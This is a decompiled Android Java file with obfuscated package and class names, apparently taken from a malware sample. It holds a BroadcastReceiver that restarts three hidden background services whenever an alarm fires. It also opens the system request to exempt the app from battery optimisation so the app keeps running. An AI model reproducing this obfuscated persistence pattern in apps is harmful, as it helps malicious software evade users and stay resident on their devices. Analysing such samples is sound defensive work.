package wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.jtfxlnc;
import wocwvy.czyxoxmbauu.slsa.kldqwysgkfcrmq;
import wocwvy.czyxoxmbauu.slsa.ukhakhcgifofl;

/* JADX INFO: loaded from: classes.dex */
public class hwfe extends BroadcastReceiver {

    /* JADX INFO: renamed from: a */
    C0020b f568a = new C0020b();

    /* JADX INFO: renamed from: a */
    void m340a(Context context, Intent intent) {
        C0020b c0020b;
        String str;
        StringBuilder sb;
        if (this.f568a.m231a()) {
            return;
        }
        this.f568a.m230a("ALARM", "START");
        if (Build.VERSION.SDK_INT < 26) {
            try {
                context.startService(new Intent(context, (Class<?>) ukhakhcgifofl.class));
            } catch (Exception e) {
                this.f568a.m230a("Error", "ALARM 1 " + e);
            }
            try {
                context.startService(new Intent(context, (Class<?>) kldqwysgkfcrmq.class));
            } catch (Exception e2) {
                this.f568a.m230a("Error", "ALARM 2 " + e2);
            }
            try {
                if (this.f568a.m232a(context, jtfxlnc.class)) {
                    return;
                }
                context.startService(new Intent(context, (Class<?>) jtfxlnc.class));
                return;
            } catch (Exception e3) {
                e = e3;
                c0020b = this.f568a;
                str = "Error";
                sb = new StringBuilder();
            }
        } else {
            if (!((PowerManager) context.getSystemService("power")).isIgnoringBatteryOptimizations(context.getPackageName())) {
                context.startActivity(new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", Uri.parse("package:" + context.getPackageName())));
                return;
            }
            try {
                context.startService(new Intent(context, (Class<?>) ukhakhcgifofl.class));
            } catch (Exception e4) {
                this.f568a.m230a("Error", "ALARM 1 " + e4);
            }
            try {
                context.startService(new Intent(context, (Class<?>) kldqwysgkfcrmq.class));
            } catch (Exception e5) {
                this.f568a.m230a("Error", "ALARM 2 " + e5);
            }
            try {
                if (this.f568a.m232a(context, jtfxlnc.class)) {
                    return;
                }
                context.startService(new Intent(context, (Class<?>) jtfxlnc.class));
                return;
            } catch (Exception e6) {
                e = e6;
                c0020b = this.f568a;
                str = "Error";
                sb = new StringBuilder();
            }
        }
        sb.append("ALARM 3 ");
        sb.append(e);
        c0020b.m230a(str, sb.toString());
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        m340a(context, intent);
    }
}
